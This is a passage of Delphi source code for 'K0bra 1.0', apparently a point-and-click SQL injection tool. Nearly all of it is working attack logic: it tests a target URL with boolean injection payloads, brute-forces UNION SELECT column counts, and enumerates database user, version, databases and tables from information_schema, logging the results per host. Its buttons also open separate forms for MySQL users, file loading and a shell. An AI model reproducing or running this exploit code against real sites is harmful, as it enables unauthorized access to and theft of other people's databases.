    regex.regex := 'K0BRA(.*)K0BRA(.*)K0BRA(.*)K0BRA';
    regex.Subject := code;
    if regex.Match then
    begin
      savefile(txtTarget.text, '');
      lstDetails.Lines.Add('[+] User : ' + regex.Groups[1]);
      lstDetails.Lines.Add('[+] Database : ' + regex.Groups[2]);
      lstDetails.Lines.Add('[+] Version : ' + regex.Groups[3]);
      savefile(txtTarget.text, '[+] User : ' + regex.Groups[1]);
      savefile(txtTarget.text, '[+] Database : ' + regex.Groups[2]);
      savefile(txtTarget.text, '[+] Version : ' + regex.Groups[3]);
      status.Panels[0].text := '[+] Done';
      kobra.status.Update;
    end
    else
    begin
      lstDetails.Lines.Add('[-] DB details not found');
      status.Panels[0].text := '[-] DB details not found';
      kobra.status.Update;
    end;

    regex.Free;
  end
  else
  begin
    MessageBox(0, Pchar('Write Target'), Pchar('K0bra 1.0'),
      MB_ICONINFORMATION);
  end;
end;

procedure Tkobra.btnUsersClick(Sender: TObject);
begin
  form_mysqluser.Show;
end;

procedure Tkobra.btnTablesClick(Sender: TObject);
var
  target: string;
  pass1: string;
  pass2: string;
  code: string;
  web1: string;
  web2: string;
  data: string;
  i: integer;
  rows: integer;
  regex: TPerlRegEx;

begin

  if (txtTarget.text = '') or not(lstDatabases.ItemIndex >= 0) then
  begin
    MessageBox(0, Pchar('Write Target and select a database'),
      Pchar('K0bra 1.0'), MB_ICONINFORMATION);
  end
  else
  begin
    target := txtTarget.text;
    regex := TPerlRegEx.Create();

    lstTables.Clear;

    pass1 := '+';
    pass2 := '--';

    data := '0x' + encodehex(lstDatabases.Items.Strings
      [lstDatabases.ItemIndex]);

    web1 := StringReplace(txtTarget.text, 'hackman',
      'unhex(hex(concat(0x4b30425241,count(*),0x4b30425241)))', []);
    web2 := StringReplace(txtTarget.text, 'hackman',
      'unhex(hex(concat(0x4b30425241,table_name,0x4b30425241)))', []);

    status.Panels[0].text := '[+] Getting tables ...';
    kobra.status.Update;

    code := nave.Get(web1 + pass1 + 'from' + pass1 + 'information_schema.tables'
      + pass1 + 'where' + pass1 + 'table_schema=' + pass1 + data + pass2);

    regex.regex := 'K0BRA(.*?)K0BRA';
    regex.Subject := code;

    if regex.Match then
    begin
      savefile(txtTarget.text, '');
      rows := StrToInt(regex.Groups[1]);
      for i := 0 to rows do
      begin

        status.Panels[0].text := '[+] Getting table : ' + IntToStr(i);
        kobra.status.Update;

        code := nave.Get(web2 + pass1 + 'from' + pass1 +
          'information_schema.tables' + pass1 + 'where' + pass1 +
          'table_schema=' + data + pass1 + 'limit' + pass1 + IntToStr(i) +
          ',1' + pass2);
        regex.regex := 'K0BRA(.*?)K0BRA';
        regex.Subject := code;
        if regex.Match then
        begin
          savefile(txtTarget.text, '[+] Database : ' +
            lstDatabases.Items.Strings[lstDatabases.ItemIndex] + ' [+] Table : '
            + regex.Groups[1]);
          lstTables.Update;
          lstTables.Items.Add(regex.Groups[1]);
        end;
      end;
      status.Panels[0].text := '[+] Done';
      kobra.status.Update;
    end
    else
    begin
      status.Panels[0].text := '[-] Tables not found';
      kobra.status.Update;
    end;

    regex.Free;
  end;
end;

procedure Tkobra.btnFileClick(Sender: TObject);
begin
  form_loadfile.Show;
end;

procedure Tkobra.btnLogsClick(Sender: TObject);
var
  urlexx: TIdURI;
  aca: string;
begin
  urlexx := TIdURI.Create(txtTarget.text);
  aca := ExtractFilePath(Application.ExeName) + '/logs/' + urlexx.Host + '.txt';
  ShellExecute(Handle, 'open', PWideChar(aca), nil, nil, SW_SHOWNORMAL);
end;

procedure Tkobra.btnShellClick(Sender: TObject);
begin
  form_shell.Show;
end;

procedure Tkobra.btnScanClick(Sender: TObject);
var
  target: string;
  url: string;
  urldos: string;
  code: string;
  codedos: string;
  pass1: string;
  pass2: string;
  i: integer;
  urltest: string;
  urlgen: string;
  regex: TPerlRegEx;

begin

  pass1 := '+';
  pass2 := '--';

  if not(txtTarget.text = '') then
  begin

    target := txtTarget.text;

    regex := TPerlRegEx.Create();

    urltest := 'concat(0x4b30425241,1,0x4b30425241)';

    status.Panels[0].text := '[+] Checking ...';
    kobra.status.Update;
    code := nave.Get(txtTarget.text + '1' + pass1 + 'and' + pass1 +
      '1=1' + pass2);
    codedos := nave.Get(txtTarget.text + '1' + pass1 + 'and' + pass1 +
      '1=0' + pass2);

    if not(code = codedos) then
    begin
      lstDetails.Lines.Add('[+] Vulnerable !');
      status.Panels[0].text := '[+] Finding columns number';
      kobra.status.Update;
      urltest := '1' + pass1 + 'and' + pass1 + '1=0' + pass1 + 'union' + pass1 +
        'select' + pass1 + 'concat(0x4b30425241,1,0x4b30425241)';
      urlgen := '1';
      for i := 2 to 36 do
      begin
        status.Panels[0].text := '[+] Columns Length : ' + IntToStr(i);
        kobra.status.Update;
        urltest := urltest + ',concat(0x4b30425241,' + IntToStr(i) +
          ',0x4b30425241)';
        urlgen := urlgen + ',' + IntToStr(i);
        code := nave.Get(txtTarget.text + urltest + pass2);
        regex.regex := 'K0BRA(.*?)K0BRA';
        regex.Subject := code;

        if regex.Match then
        begin
          lstDetails.Lines.Add('[+] Columns Length : ' + IntToStr(i));
          lstDetails.Lines.Add('[+] The number ' + regex.Groups[1] +
            ' show data');

          savefile(txtTarget.text, '');
          savefile(txtTarget.text, '[+] Columns Length : ' + IntToStr(i));
          savefile(txtTarget.text, '[+] The number ' + regex.Groups[1] +
            ' show data');

          urlgen := StringReplace(urlgen, regex.Groups[1], 'hackman', []);
          txtTarget.text := txtTarget.text + '1' + pass1 + 'and' + pass1 + '1=0'
            + pass1 + 'union' + pass1 + 'select' + pass1 + urlgen;

          status.Panels[0].text := '[+] Done';
          kobra.status.Update;
          abort;
        end
      end;
      status.Panels[0].text := '[-] Columns Length not found';
      kobra.status.Update;
    end
    else
    begin
      status.Panels[0].text := '[-] Not vulnerable';
      kobra.status.Update;
    end;

    regex.Free;

  end
  else
  begin
    MessageBox(0, Pchar('Write Target'), Pchar('K0bra 1.0'),
      MB_ICONINFORMATION);
  end;
end;

end.

// The End ?
